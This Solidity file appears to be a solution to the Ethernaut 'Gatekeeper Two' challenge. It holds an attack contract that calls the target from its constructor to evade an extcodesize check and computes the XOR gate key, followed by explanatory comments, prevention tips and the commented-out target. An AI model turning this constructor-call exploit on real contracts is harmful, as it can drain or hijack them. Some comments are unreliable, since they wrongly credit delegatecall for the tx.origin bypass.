pragma solidity ^0.6.0;

contract KeyMaster {
    constructor(address _address) public {
        bytes8 _key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        _address.call(abi.encodeWithSignature("enter(bytes8)", _key));
    }
}

/*

Contract below is the original ethernaut contract.

XOR operand, if a ^ b = c then a ^ c = b
Delegate call can be used to bypass msg.sender != tx.origin, the contract used to make the call
will be msg.sedner and the EOA(externally owned account) will be tx.origin.

Security issues with contract: 

  - uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0), can be bypassed by putting the call function in the constructor. The constructor
    is called first. This will result in the data size value of the smart contract equalling 0.



Prevention:

  - No code present shpuld not be a method of security, no code does not always mean the caller is an 
    EOA. 
  - Awareness that as well as functions, constructors can also be inherited from external contracts.

*/

// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// contract GatekeeperTwo {
//     address public entrant;

//     modifier gateOne() {
//         require(msg.sender != tx.origin);
//         _;
//     }

//     modifier gateTwo() {
//         uint256 x;
//         assembly {
//             x := extcodesize(caller())
//         }
//         require(x == 0);
//         _;
//     }

//     modifier gateThree(bytes8 _gateKey) {
//         require(
//             uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
//                 uint64(_gateKey) ==
//                 uint64(0) - 1
//         );
//         _;
//     }

//     function enter(bytes8 _gateKey)
//         public
//         gateOne
//         gateTwo
//         gateThree(_gateKey)
//         returns (bool)
//     {
//         entrant = tx.origin;
//         return true;
//     }
// }
